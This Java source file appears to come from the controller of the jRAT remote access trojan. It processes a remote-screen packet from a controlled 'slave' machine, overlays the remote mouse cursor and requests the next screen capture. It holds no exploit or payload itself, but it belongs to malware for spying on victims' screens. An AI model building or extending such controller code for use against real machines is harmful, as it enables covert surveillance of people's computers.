package se.jrat.controller.packets.incoming;

import java.awt.Color;
import java.awt.Graphics2D;
import java.awt.image.BufferedImage;
import java.io.DataInputStream;

import se.jrat.controller.Cursor;
import se.jrat.controller.Slave;
import se.jrat.controller.packets.outgoing.Packet12RemoteScreen;
import se.jrat.controller.ui.frames.FrameRemoteScreen;

public class Packet68RemoteScreenComplete extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int mouseX = slave.readInt();
		int mouseY = slave.readInt();
				
		FrameRemoteScreen frame = FrameRemoteScreen.INSTANCES.get(slave);
		
		if (frame != null) {
			BufferedImage buffer = frame.getBuffer();
			if (buffer != null) {
				BufferedImage image = new BufferedImage(buffer.getWidth(), buffer.getHeight(), BufferedImage.TYPE_INT_RGB);
				
				Graphics2D imageGraphics = (Graphics2D) image.getGraphics();
				
				imageGraphics.drawImage(buffer, 0, 0, buffer.getWidth(), buffer.getHeight(), null);
				Cursor.drawCursor(slave.getOperatingSystem().getType(), imageGraphics, mouseX, mouseY);
				
				boolean drawGrid = false;
				
				if (drawGrid) {
					imageGraphics.setColor(Color.red);
					for (int x = 0; x < frame.getRows(); x++) {
						for (int y = 0; y < frame.getColumns(); y++) {
							int chunkWidth = buffer.getWidth() / frame.getColumns();
							int chunkHeight = buffer.getHeight() / frame.getRows();
							imageGraphics.drawRect(chunkWidth * y, chunkHeight * x, chunkWidth * y + chunkWidth, chunkHeight * x + chunkHeight);
						}
					}
				}
				
				frame.drawOverlay(image);
				frame.setBlockSizeLabel(frame.getTransmitted() / 1024);
				frame.setChunksLabel(frame.getChunks());
				frame.setTransmitted(0);
			}
            if (frame.isRunning()) {
                slave.addToSendQueue(new Packet12RemoteScreen(frame.getImageSize(), frame.getQuality(), frame.getMonitor(), frame.getColumns(), frame.getRows()));
				frame.setTransmitted(0);
				frame.setChunks(0);
            }
   		}
	}

}
